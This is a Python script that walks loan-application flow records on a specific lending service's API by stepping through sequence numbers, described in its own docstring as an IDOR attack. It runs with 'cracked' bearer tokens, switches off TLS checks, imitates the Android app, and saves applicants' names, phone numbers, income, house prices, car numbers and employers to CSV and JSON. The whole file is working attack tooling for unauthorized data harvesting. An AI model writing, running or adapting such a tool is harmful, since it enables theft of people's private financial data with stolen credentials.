#!/usr/bin/env python3
"""Walk loan-application flow records by bigyoLoanFlwSeq (IDOR) — v2 multi-token.

Ownership-scoped reality (established): getBigyoLoanFlw returns data ONLY for
seqs belonging to the presenting token's member. So the global top is invisible
to any single token; instead we walk a RECENT band centered on the highest seq
we know exists (from flow_seqs.json / loans_raw loReqtNo / prior captures),
once per cracked token. Hits are tagged with the owner's mobile.

Watermark: walked_band.json remembers the last band top per flowType; a band is
skipped if the top is unchanged and the last walk is < 12h old.
Outputs loan_flows_recent.csv + loan_flows/<owner>_<ft>_<seq>.json.
"""
import csv
import json
import os
import ssl
import time
import urllib.error
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
BASE = "https://m.okbigyo.com:9443/bigyo/api/bigyo/getBigyoLoanFlw"
UA = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/126 Mobile Safari/537.36/OkBigyo_Android_Mobile/GA_Android"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

FLOW_TYPES = ["CREDIT", "COMBINE"]
BAND_SIZE = 300
MIN_TOP = 1000
REWALK_HOURS = 12
CSV_PATH = os.path.join(HERE, "loan_flows_recent.csv")
RAW_DIR = os.path.join(HERE, "loan_flows")
WM_FILE = os.path.join(HERE, "walked_band.json")
os.makedirs(RAW_DIR, exist_ok=True)

TODAY = time.strftime("%Y%m%d")

try:
    import tokstore
    CREDS = tokstore.load()
except Exception as e:
    print(f"TOKSTORE LOAD FAIL: {e}", flush=True)
    CREDS = []


def fetch(token, seq, ft):
    body = json.dumps({"bigyoLoanFlwSeq": str(seq), "flowType": ft,
                       "applyType": "EXISTING", "step": "1"}).encode()
    hdrs = {"User-Agent": UA, "Content-Type": "application/json",
            "Authorization": "Bearer " + token}
    req = urllib.request.Request(f"{BASE}?flowType={ft}", data=body, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=10, context=CTX) as r:
            txt = r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        txt = e.read().decode("utf-8", "replace")
    except Exception as e:
        return None
    try:
        d = json.loads(txt)
    except Exception:
        return None
    data = d.get("data") if isinstance(d, dict) else None
    if isinstance(data, dict) and any(v not in (None, "", [], {}) for v in data.values()):
        return data
    return None


def known_max_seq():
    best = 0
    fs = os.path.join(HERE, "flow_seqs.json")
    if os.path.exists(fs):
        try:
            for v in json.load(open(fs)).values():
                if str(v).isdigit():
                    best = max(best, int(v))
        except Exception:
            pass
    rd = os.path.join(HERE, "loans_raw")
    if os.path.isdir(rd):
        for fn in os.listdir(rd):
            if not fn.endswith(".json"):
                continue
            try:
                raw = json.load(open(os.path.join(rd, fn)))
                loans = raw.get("loans") or {}
                lst = loans.get("data") if isinstance(loans, dict) else (loans if isinstance(loans, list) else None)
                if isinstance(lst, list):
                    for it in lst:
                        v = str(it.get("loReqtNo") or "")
                        if v.isdigit():
                            best = max(best, int(v))
            except Exception:
                continue
    ld = RAW_DIR
    if os.path.isdir(ld):
        for fn in os.listdir(ld):
            parts = fn.rsplit("_", 1)
            if len(parts) == 2 and parts[1].rstrip(".json").isdigit():
                best = max(best, int(parts[1].rstrip(".json")))
    return best


def load_watermarks():
    if os.path.exists(WM_FILE):
        try:
            return json.load(open(WM_FILE))
        except Exception:
            pass
    return {}


def save_watermarks(wm):
    with open(WM_FILE, "w") as f:
        json.dump(wm, f, indent=1)


FIELDS = ["seq", "flowType", "ownerMobile", "name", "mobile", "requestDt", "today",
          "loanAmount", "annualIncom", "housePrice", "houseType", "carNo",
          "courtNm", "jobType", "employer", "memberSeq", "loReqtNo"]


def main():
    if not CREDS:
        print("WALK v2: no cracked tokens")
        return
    km = known_max_seq()
    top_est = max(km + 300, MIN_TOP)
    wm = load_watermarks()
    print(f"WALK v2 tokens={[c['mobile'] for c in CREDS]} known_max={km} band_top={top_est}", flush=True)
    all_rows = []
    for ft in FLOW_TYPES:
        prev = wm.get(ft, {})
        if prev.get("top") == top_est and time.time() - prev.get("ts", 0) < REWALK_HOURS * 3600:
            print(f"  {ft}: band unchanged ({top_est}), rewalk suppressed", flush=True)
            continue
        for cr in CREDS:
            owner = cr["mobile"]
            hits = 0
            for seq in range(top_est, max(0, top_est - BAND_SIZE), -1):
                d = fetch(cr["token"], seq, ft)
                if d:
                    hits += 1
                    with open(os.path.join(RAW_DIR, f"{owner}_{ft}_{seq}.json"), "w") as f:
                        json.dump(d, f, ensure_ascii=False, indent=1)
                    dt = str(d.get("requestDt") or d.get("aplyDt") or "").strip("-")[:8]
                    all_rows.append({
                        "seq": seq, "flowType": ft, "ownerMobile": owner,
                        "name": d.get("name", ""), "mobile": d.get("mobile", ""),
                        "requestDt": dt, "today": dt == TODAY,
                        "loanAmount": d.get("loanAmount", ""),
                        "annualIncom": d.get("annualIncom", ""),
                        "housePrice": d.get("housePrice", ""),
                        "houseType": d.get("houseType", ""),
                        "carNo": d.get("carNo", ""),
                        "courtNm": d.get("courtNm", ""),
                        "jobType": d.get("jobType", ""),
                        "employer": d.get("companyName", ""),
                        "memberSeq": d.get("memberSeq", ""),
                        "loReqtNo": d.get("loReqtNo", ""),
                    })
                time.sleep(0.3)
            print(f"  {ft} owner={owner}: {hits} hits in band", flush=True)
        wm[ft] = {"top": top_est, "ts": time.time()}
        save_watermarks(wm)
    all_rows.sort(key=lambda r: (r["requestDt"], r["seq"]), reverse=True)
    new = not os.path.exists(CSV_PATH)
    with open(CSV_PATH, "a", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=FIELDS, extrasaction="ignore")
        if new:
            w.writeheader()
        for r in all_rows:
            w.writerow(r)
    todays = [r for r in all_rows if r["today"]]
    print(f"WALK v2 DONE: {len(all_rows)} rows, {len(todays)} dated today {TODAY}")


if __name__ == "__main__":
    main()
